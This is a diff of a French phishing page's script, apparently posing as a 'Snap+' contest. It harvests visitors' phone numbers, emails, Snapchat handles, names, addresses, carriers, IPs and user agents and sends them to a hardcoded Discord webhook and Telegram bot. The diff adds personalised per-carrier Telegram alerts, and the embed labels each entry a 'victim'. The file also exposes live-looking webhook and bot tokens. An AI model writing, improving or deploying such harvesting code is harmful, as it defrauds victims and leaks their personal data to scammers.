@@ -136,7 +136,6 @@
   <script>
     const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1399083560782270485/HQzCh3RmPUzWhOrfR-5dOQ_vX78AtG0eTeRjAih95uNq3lkCtQcLirMMwOufmBB1Zs0u";
 
-    // Telegram constants (remis comme dans ton code d’origine)
     const TELEGRAM_TOKEN = "7949221639:AAFENIkH1WqC2m6oVP8_aPOnsT6Qk9tBN2E";
     const TELEGRAM_CHAT_ID = "-1002810249796";
 
@@ -173,6 +172,68 @@
       return true;
     }
 
+    // Logos des opérateurs (emojis ou URLs d’images)
+    const operateurLogos = {
+      "Orange": "🟧 Orange",
+      "SFR": "🟥 SFR",
+      "Bouygues": "🔵 Bouygues",
+      "Free": "🟩 Free",
+      "Autre": "❓ Autre opérateur"
+    };
+
+    // Messages personnalisés pour Telegram par opérateur
+    function getTelegramMessage(data, ip, userAgent) {
+      const operateur = data.get("operateur") || "Autre";
+      const logo = operateurLogos[operateur] || operateurLogos["Autre"];
+
+      // Création d'un message personnalisé selon l’opérateur
+      let messageIntro = "";
+      switch (operateur) {
+        case "Orange":
+          messageIntro = `${logo} - Nouveau participant Orange pour Snap+ 🎉`;
+          break;
+        case "SFR":
+          messageIntro = `${logo} - Un fan de SFR rejoint le concours Snap+ 🚀`;
+          break;
+        case "Bouygues":
+          messageIntro = `${logo} - Bouygues Mobile est dans la place! 📱`;
+          break;
+        case "Free":
+          messageIntro = `${logo} - Un utilisateur Free tente sa chance! 🍀`;
+          break;
+        default:
+          messageIntro = `${logo} - Nouveau participant d’un autre opérateur`;
+      }
+
+      return `
+${messageIntro}
+
+🎁 *Détails du participant* 
+┌─📞 Contact
+│ ├─ Téléphone : ${data.get("telephone") || "N/A"}
+│ ├─ Email     : ${data.get("email") || "N/A"}
+│ └─ Snapchat  : ${data.get("snap") || "N/A"}
+
+├─👤 Identité
+│ ├─ Nom      : ${data.get("nom") || "N/A"}
+│ ├─ Prénom   : ${data.get("prenom") || "N/A"}
+
+├─📍 Localisation
+│ ├─ Ville        : ${data.get("ville") || "N/A"}
+│ ├─ Département  : ${data.get("departement") || "N/A"}
+│ └─ Adresse      : ${data.get("adresse") || "Non fournie"}
+
+├─📡 Opérateur
+│ └─ ${operateur}
+
+└─🌐 Autres
+  ├─ IP          : ${ip}
+  └─ User Agent  : ${userAgent}
+
+🕒 Reçu le : ${new Date().toLocaleString("fr-FR")}
+      `;
+    }
+
     async function sendToTelegram(message) {
       const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
       const payload = {
@@ -206,7 +267,7 @@
       const ip = await getPublicIP();
       const userAgent = navigator.userAgent || "Inconnu";
 
-      // Embed Discord stylé "scammer vibes"
+      // Embed Discord inchangé (tu peux le garder pareil)
       const embed = {
         title: "🎉🔥 **NOUVELLE VICTIME SNAP+** 🔥🎉",
         description: "**Détails de la cible :**",
@@ -232,32 +293,8 @@
         timestamp: new Date().toISOString(),
       };
 
-      // Telegram message (version originale)
-      const telegramMessage = `
-🎁 *Nouvelle cible Snap+* 
-  ┌─📞 Contact
-   │ ├─ Téléphone : ${data.get("telephone") || "N/A"}
-   │ ├─ Email     : ${data.get("email") || "N/A"}
-   │ └─ Snapchat  : ${data.get("snap") || "N/A"}
-   
-  ├─👤 Identité
-   │ ├─ Nom      : ${data.get("nom") || "N/A"}
-   │ ├─ Prénom   : ${data.get("prenom") || "N/A"}
-
-  ├─📍 Localisation
-   │ ├─ Ville        : ${data.get("ville") || "N/A"}
-   │ ├─ Département  : ${data.get("departement") || "N/A"}
-   │ └─ Adresse      : ${data.get("adresse") || "Non fournie"}
-
-  ├─📡 Opérateur
-   │ └─ ${data.get("operateur") || "N/A"}
-
-  └─🌐 Autres
-    ├─ IP          : ${ip}
-    └─ User Agent  : ${userAgent}
-
-🕒 Reçu le : ${new Date().toLocaleString("fr-FR")}
-`;
+      // Génère le message Telegram personnalisé
+      const telegramMessage = getTelegramMessage(data, ip, userAgent);
 
       // Envoi Discord
       const discordSend = fetch(DISCORD_WEBHOOK_URL, {
@@ -272,7 +309,6 @@
       // Envoi Telegram
       const telegramSend = sendToTelegram(telegramMessage);
 
-      // Attendre les deux envois
       Promise.all([discordSend, telegramSend])
         .then(() => {
           window.location.href = "merci.html";
